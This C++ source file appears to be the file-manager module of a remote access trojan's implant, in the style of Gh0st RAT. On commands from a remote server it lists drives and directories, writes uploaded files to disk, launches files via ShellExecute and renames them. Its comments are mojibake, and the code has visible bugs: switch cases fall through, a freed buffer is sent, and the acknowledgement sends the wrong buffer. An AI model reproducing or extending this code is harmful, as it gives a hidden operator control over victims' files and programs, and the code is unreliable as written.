#include "stdafx.h"
#include "FileManager.h"
#include <shellapi.h>

CFileManager::CFileManager(IOCPClient* ClientObject)
	:CManager(ClientObject)
{
	m_ulTransferMode = TRANSFER_MODE_NORMAL;
	SendDiskDriverList();
}


CFileManager::~CFileManager()
{
	std::cout << "Զ���ļ�����" << "\r\n";
}

VOID CFileManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch (szBuffer[0])
	{
		case COMMAND_LIST_FILES:
		{
			//(char*)szBuffer + 1  ��·��
			SendFileList((char*)szBuffer + 1);
			break;
		}
		case COMMAND_FILE_SIZE:
		{
			CreateClientRecvFile(szBuffer + 1);
			break;
		}
		case COMMAND_FILE_DATA:
		{
			WriteClientRecvFile(szBuffer + 1, ulLength - 1);
		}
		case COMMAND_SET_TRANSFER_MODE:
		{
			SetTransferMode(szBuffer + 1);
			break;
		}
		case COMMAND_OPEN_FILE_SHOW:
		{
			//�򿪵����ļ���
			ShellExecute(NULL, "Open", (char*)(szBuffer + 1), NULL, NULL, SW_SHOW);
		}
		case COMMAND_RENAME_FILE:
		{
			szBuffer += 1;
			char* szExistingFileFullPath = NULL;
			char* szNewFileFullPath = NULL;
			szNewFileFullPath = szExistingFileFullPath = (char*)szBuffer;
			szNewFileFullPath += strlen((char*)szNewFileFullPath) + 1;
			Rename(szExistingFileFullPath, szNewFileFullPath);
		}
		default:
			break;
	}
}

ULONG CFileManager::SendDiskDriverList()
{
	char szDiskDriverString[0x500] = { 0 };  //������е��߼��̷�
	BYTE szBuffer[0x1000] = { 0 };           //��Ϣ
	char szFileSystem[MAX_PATH] = { 0 };
	char* Travel = NULL;
	szBuffer[0] = TOKEN_DRIVE_LIST; //��ϢͷΪ�������б�
	//�����е��߼���������
	GetLogicalDriveStrings(sizeof(szDiskDriverString), szDiskDriverString);

	Travel = szDiskDriverString;

	unsigned __int64 ulHardDiskAmount = 0;    //���̴�С
	unsigned __int64 ulHardDiskFreeSpace = 0; //ʣ���С
	unsigned long ulHardDiskAmountMB = 0;
	unsigned long ulHardDiskFreeMB = 0;
	DWORD dwOffset = 1;
	for (dwOffset = 1;*Travel != '\0';Travel += lstrlen(Travel)+1)
	{

		memset(szFileSystem, 0, sizeof(szFileSystem));
		//��ȡ������Ϣ
		GetVolumeInformation(Travel, NULL, 0, NULL, NULL, NULL, szFileSystem, MAX_PATH);
		ULONG ulFileSystemLength = lstrlen(szFileSystem) + 1;
		SHFILEINFO	sfi;

		SHGetFileInfo(Travel, FILE_ATTRIBUTE_NORMAL, &sfi,
			sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		ULONG ulDiskTypeNameLength = lstrlen(sfi.szTypeName) + 1;

		//��ô��̵Ŀռ��С
		if (Travel[0] != 'A' && Travel[0] != 'B'
			&&GetDiskFreeSpaceEx(Travel, (PULARGE_INTEGER)&ulHardDiskFreeSpace,
			(PULARGE_INTEGER)&ulHardDiskAmount, NULL))
		{
			ulHardDiskAmountMB = ulHardDiskAmount / 1024 / 1024;         //���������ֽ�Ҫת����G
			ulHardDiskFreeMB = ulHardDiskFreeSpace / 1024 / 1024;
		}
		else
		{
			ulHardDiskAmountMB = 0;
			ulHardDiskFreeMB = 0;
		}

		szBuffer[dwOffset] = Travel[0];
		szBuffer[dwOffset + 1] = GetDriveType(Travel);
		memcpy(szBuffer + dwOffset + 2, &ulHardDiskAmountMB, sizeof(unsigned long));
		memcpy(szBuffer + dwOffset + 6, &ulHardDiskFreeMB, sizeof(unsigned long));

		memcpy(szBuffer + dwOffset + 10, sfi.szTypeName, ulDiskTypeNameLength);
		memcpy(szBuffer + dwOffset + 10 + ulDiskTypeNameLength, szFileSystem,
			ulFileSystemLength);

		dwOffset += 10 + ulDiskTypeNameLength + ulFileSystemLength;
		
	}
	
	return m_ClientObject->OnServerSending((char*)szBuffer, dwOffset);
}

ULONG CFileManager::SendFileList(char * szDirectoryPath)
{
	// ���ô��䷽ʽ
	m_ulTransferMode = TRANSFER_MODE_NORMAL;
	ULONG ulReturn = 0;
	DWORD dwOffset = 0;
	BYTE* szBuffer = NULL;
	ULONG ulLength = 1024 * 10; // �ȷ���10K�Ļ�����;

	szBuffer = (BYTE*)LocalAlloc(LPTR, ulLength);
	if (szBuffer == NULL)
	{
		return 0;
	}

	char szDirectoryFullPath[MAX_PATH] = { 0 };
	wsprintf(szDirectoryFullPath, "%s\\*.*", szDirectoryPath);


	HANDLE FileHandle = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATA wfd;
	FileHandle = FindFirstFile(szDirectoryFullPath, &wfd);
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;

		if (szBuffer != NULL)
		{
			LocalFree(szBuffer);
			szBuffer = NULL;
		}
		return m_ClientObject->OnServerSending((char*)szBuffer, 1);
	}
	szBuffer[0] = TOKEN_FILE_LIST;
	dwOffset = 1;
	do 
	{
		//����Ƿ����������ڴ�
		if (dwOffset > (ulLength - MAX_PATH*2))
		{
			ulLength += MAX_PATH * 2;
			szBuffer = (BYTE*)LocalReAlloc(szBuffer,
				ulLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
		}

		char* szFileName = wfd.cFileName;

		if (strcmp(szFileName,".") == 0 || strcmp(szFileName,"..") == 0 )
		{
			continue;
		}
		*(szBuffer + dwOffset) = wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		ULONG ulFileNameLength = strlen(szFileName);
		memcpy(szBuffer + dwOffset, szFileName, ulFileNameLength);
		dwOffset += ulFileNameLength;
		*(szBuffer + dwOffset) = 0;
		dwOffset++;

		//�ļ���С

		memcpy(szBuffer + dwOffset, &wfd.nFileSizeHigh, sizeof(DWORD));
		memcpy(szBuffer + dwOffset + 4, &wfd.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// ������ʱ�� 8 �ֽ�
		memcpy(szBuffer + dwOffset, &wfd.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;

	} while (FindNextFile(FileHandle,&wfd));

	ulReturn = m_ClientObject->OnServerSending((char*)szBuffer, dwOffset);
	LocalFree(szBuffer);
	FindClose(FileHandle);
	return ulReturn;

}

VOID CFileManager::CreateClientRecvFile(LPBYTE szBuffer)
{
	FILE_SIZE* FileSize = (FILE_SIZE*)szBuffer;

	memset(m_szOperatingFileName, 0, sizeof(m_szOperatingFileName));
	strcpy(m_szOperatingFileName, (char*)szBuffer + 8);
	// �����ļ�����
	m_OperatingFileLength =
		(FileSize->dwSizeHigh * (MAXDWORD + 1)) + FileSize->dwSizeLow;

	MakeSureDirectoryPathExists(m_szOperatingFileName);

	WIN32_FIND_DATA wfd;
	//�ļ�����
	HANDLE FileHandle = FindFirstFile(m_szOperatingFileName, &wfd);
	if (FileHandle != INVALID_HANDLE_VALUE &&
		m_ulTransferMode != TRANSFER_MODE_OVERWRITE_ALL
		&& m_ulTransferMode != TRANSFER_MODE_JUMP_ALL)
	{
		BYTE	bToken[1];
		bToken[0] = TOKEN_GET_TRANSFER_MODE;
		m_ClientObject->OnServerSending((char*)&bToken, sizeof(bToken));
	}
	else
	{
		GetFileData();
	}
	FindClose(FileHandle);

}
//ȷ���ļ����Ƿ����
BOOL CFileManager::MakeSureDirectoryPathExists(char * szDirectoryFullPath)
{
	char* szTravel = NULL;
	char* szBuffer = NULL;
	DWORD dwAttributes = 0;
	__try
	{
		szBuffer = (char*)malloc(sizeof(char)*(strlen(szDirectoryFullPath) + 1));
		if (szBuffer == NULL)
		{
			return FALSE;
		}
		strcpy(szBuffer, szDirectoryFullPath);
		szTravel = szBuffer;

		if (*(szTravel + 1) == ':')
		{
			szTravel++;
			szTravel++;
			if (*szTravel && (*szTravel == '\\'))
			{
				szTravel++;
			}
		}
		while (*szTravel)
		{
			if (*szTravel == '\\')
			{
				*szTravel = '\0';
				dwAttributes = GetFileAttributes(szBuffer);   //�鿴�Ƿ��Ƿ�Ŀ¼  Ŀ¼������
				if (dwAttributes == 0xffffffff)
				{
					if (!CreateDirectory(szBuffer, NULL))
					{
						if (GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(szBuffer);
							return FALSE;
						}
					}
				}
				else
				{
					if ((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						free(szBuffer);
						szBuffer = NULL;
						return FALSE;
					}
				}

				*szTravel = '\\';
			}
			szTravel = CharNext(szTravel);
		}

	}

	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		if (szBuffer != NULL)
		{
			free(szBuffer);

			szBuffer = NULL;
		}

	
		return FALSE;
	}
	if (szBuffer != NULL)
	{
		free(szBuffer);
		szBuffer = NULL;
	}
	return TRUE;
}
VOID CFileManager::GetFileData()
{
	int iTransferMode = 0;
	switch (m_ulTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		iTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		iTransferMode = TRANSFER_MODE_JUMP;   //CreateFile��always open����eixt��
		break;
	default:
		iTransferMode = m_ulTransferMode;   //1.  2 3
	}

	WIN32_FIND_DATA wfd;
	HANDLE FileHandle = FindFirstFile(m_szOperatingFileName, &wfd);

	BYTE bToken[9] = { 0 };
	DWORD dwCreationDisposition = 0;
	bToken[0] = TOKEN_DATA_CONTINUE;
	if (FileHandle != INVALID_HANDLE_VALUE)
	{
		//����
		if (iTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			dwCreationDisposition = CREATE_ALWAYS;
		}
		else
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, sizeof(DWORD));
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		//����һ���µ��ļ�
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(FileHandle);

	//����һ���µ��ļ�
	FileHandle = CreateFile(m_szOperatingFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0);
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		m_OperatingFileLength = 0;
		return;
	}
	CloseHandle(FileHandle);
	m_ClientObject->OnServerSending((char*)&bToken, sizeof(bToken));

}

VOID CFileManager::WriteClientRecvFile(LPBYTE szBuffer, ULONG ulLength)
{
	BYTE *Travel = NULL;
	DWORD dwNumberOfBytesToWrite = 0;
	DWORD dwNumberOfBytesWrite = 0;
	int iHeadLength = 9;
	FILE_SIZE* FileSize = NULL;
	
	Travel = szBuffer + 8;
	FileSize = (FILE_SIZE*)szBuffer;

	LONG dwOffsetHigh = FileSize->dwSizeHigh;
	LONG dwOffsetLow = FileSize->dwSizeLow;
	dwNumberOfBytesToWrite = ulLength - 8;
	HANDLE FileHandle = CreateFile(
		m_szOperatingFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0);

	SetFilePointer(FileHandle, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int iReturn = 0;
	WriteFile(FileHandle,
		Travel,
		dwNumberOfBytesToWrite,
		&dwNumberOfBytesWrite,
		NULL);
	CloseHandle(FileHandle);
	BYTE bToken[9] = { 0 };
	bToken[0] = TOKEN_DATA_CONTINUE;
	dwOffsetLow += dwNumberOfBytesWrite;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	m_ClientObject->OnServerSending((char*)szBuffer, sizeof(bToken));
}

VOID CFileManager::SetTransferMode(LPBYTE szBuffer)
{
	memcpy(&m_ulTransferMode, szBuffer, sizeof(m_ulTransferMode));
	GetFileData();
}

VOID CFileManager::Rename(char * szExisting, char * szNewFileFullPath)
{
	MoveFile(szExisting, szNewFileFullPath);
}
